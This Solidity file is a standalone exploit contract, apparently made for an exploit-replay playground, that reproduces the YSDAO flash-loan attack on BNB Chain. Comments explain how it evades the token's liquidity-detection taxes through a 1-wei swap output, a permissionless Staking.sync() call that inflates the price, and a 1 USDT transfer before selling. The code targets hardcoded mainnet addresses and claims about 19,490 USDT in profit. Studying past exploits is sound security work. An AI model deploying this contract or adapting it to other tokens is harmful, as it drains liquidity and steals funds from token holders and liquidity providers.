// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// SYNTHETIC exploit for the EVM Playground — a standalone contract that faithfully
// reproduces the inline attack from DeFiHackLabs' YSDAO_exp.sol (the Foundry test is
// itself the flash receiver, with pancakeV3FlashCallback + pancakeCall on the test
// contract). Here the same logic lives in a deployable contract whose run() drives the
// attack and whose own USDT balance holds the profit (~19,490.91 USDT).
//
// Attack: YSDAO's transfer protection detects add/remove liquidity by comparing the
// Pancake V2 pair's live token balances against its reserves.
//   1. Under a V3 USDT flash loan, buy YSDAO via a direct pair.swap that outputs 1 wei
//      USDT, so _isRemoveLiquidity() sees pair USDT below reserve and skips buy tax.
//   2. Call the permissionless Staking.sync(), which donates staking-held USDT into the
//      pair and syncs — inflating the apparent YSDAO price.
//   3. Transfer 1 USDT into the pair before selling so _isAddLiquidity() treats the sale
//      as a liquidity add and bypasses the harsher sell/profit tax, then dump YSDAO.

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPancakeV2PairMinimal {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeV2RouterMinimal {
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) external pure returns (uint256 amountOut);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakeV3PoolMinimal {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IYSDAOStaking {
    function sync() external;
}

contract YSDAOExploit {
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant YSDAO = 0xC036A13d7A6A84677DfCCeC483eed124654B7918;
    address constant STAKING = 0x3E13019dA3BAAd134493e751704D2D4245Eec7CA;
    address constant YSDAO_USDT_PAIR = 0x24Df7bdBC67b0EB03074Ea9d8CbbA0445fB35937;
    address constant USDT_WBNB_V3_POOL = 0x172fcD41E0913e95784454622d1c3724f546f849;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 constant FLASH_AMOUNT = 8_000_002 ether;
    uint256 constant BUY_USDT_AMOUNT = 8_000_000 ether;
    uint256 constant PAIR_CALLBACK_REPAY = 8_000_000 ether + 2;

    // Entry point: take the V3 USDT flash loan; the whole attack runs in the callback.
    function run() external {
        IPancakeV3PoolMinimal(USDT_WBNB_V3_POOL).flash(
            address(this), FLASH_AMOUNT, 0, abi.encode(USDT_WBNB_V3_POOL, FLASH_AMOUNT)
        );
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        (address pool, uint256 amount) = abi.decode(data, (address, uint256));
        require(msg.sender == pool && msg.sender == USDT_WBNB_V3_POOL, "invalid flash callback");
        require(fee1 == 0, "unexpected token1 fee");

        (uint112 reserveUSDT, uint112 reserveYSDAO,) = IPancakeV2PairMinimal(YSDAO_USDT_PAIR).getReserves();
        uint256 ysdaoOut =
            IPancakeV2RouterMinimal(PANCAKE_ROUTER).getAmountOut(BUY_USDT_AMOUNT, reserveUSDT, reserveYSDAO);

        // Outputting 1 wei USDT makes YSDAO's _isRemoveLiquidity() branch true during transfer.
        IPancakeV2PairMinimal(YSDAO_USDT_PAIR).swap(1, ysdaoOut, address(this), hex"30783031");

        // Permissionless: donates staking-held USDT into the pair and syncs reserves.
        IYSDAOStaking(STAKING).sync();

        // Makes YSDAO's _isAddLiquidity() branch true before selling through the router.
        IERC20Minimal(USDT).transfer(YSDAO_USDT_PAIR, 1 ether);

        IERC20Minimal(YSDAO).approve(PANCAKE_ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = YSDAO;
        path[1] = USDT;

        uint256 ysdaoBalance = IERC20Minimal(YSDAO).balanceOf(address(this));
        IPancakeV2RouterMinimal(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ysdaoBalance, 0, path, address(this), block.timestamp + 60
        );

        IERC20Minimal(USDT).transfer(USDT_WBNB_V3_POOL, amount + fee0);
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        require(msg.sender == YSDAO_USDT_PAIR, "invalid v2 callback");
        IERC20Minimal(USDT).transfer(YSDAO_USDT_PAIR, PAIR_CALLBACK_REPAY);
    }
}
